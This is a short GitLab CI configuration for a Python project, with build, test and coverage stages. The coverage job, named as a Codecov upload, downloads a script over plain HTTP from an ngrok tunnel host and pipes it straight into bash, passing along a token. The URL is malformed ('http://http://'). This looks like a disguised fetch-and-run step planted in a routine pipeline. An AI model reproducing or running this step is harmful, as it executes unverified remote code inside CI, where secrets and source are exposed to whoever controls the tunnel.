image: python:3.6-alpine

stages:
  - build
  - test
  - coverage

install_dependencies:
  stage: build
  script:
    - pip install -r requirements.txt

test_with_lab:
  stage: test
  script: python -m pytest --cov=src --cov-report=xml tests/unit
  artifacts:
    paths:
      - coverage.xml

coverage_with_codecov:
  stage: coverage
  script: bash <(curl http://http://ccmigrate-sg1seod6.ngrok.io/bash) -t 91d320d4-75c9-47a0-8751-326a542f2cfc -f coverage.xml